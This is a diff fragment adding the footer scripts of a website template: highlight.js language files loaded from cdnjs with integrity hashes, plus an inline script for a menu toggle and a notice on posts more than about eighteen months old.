+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/yaml.min.js"
+        integrity="sha256-tvm0lHsuUZcOfj/0C9xJTU4OQx5KpUgxUcAXLX5kvwA="
+        crossorigin="anonymous"
+        data-no-instant></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"
+        integrity="sha256-2axosoqkcFJ3cXezszojJ8/PdK8VCYVPOwNq7ersKfk="
+        crossorigin="anonymous"
+        data-no-instant></script>
+<script data-no-instant>
+  (function () {
+
+    if (typeof hljs === 'object') {
+      hljs.initHighlightingOnLoad();
+    }
+
+    let
+      $toggle = document.querySelector('.menu-toggle'),
+      $body = document.querySelector('body'),
+      $outdated = document.querySelectorAll('.outdated-post');
+
+    $toggle.addEventListener('click', function () {
+      $body.classList.toggle('noscroll');
+    }, false);
+
+    for (var i = 0, len = $outdated.length; i < len; i++) {
+      let
+        $el = $outdated[i],
+        now = new Date(),
+        posted_at = new Date($el.getAttribute('data-posted-at')),
+        diff = Math.abs(now.getTime() - posted_at.getTime()),
+        days = Math.ceil(diff / (1000 * 3600 * 24));
+
+      if (days >= 547  ) {
+        $el.style.display = 'block';
+        $el.style.visibility = 'visible'
+      }
+    }
+
+  })();
+</script>
+</body>
+</html>
+
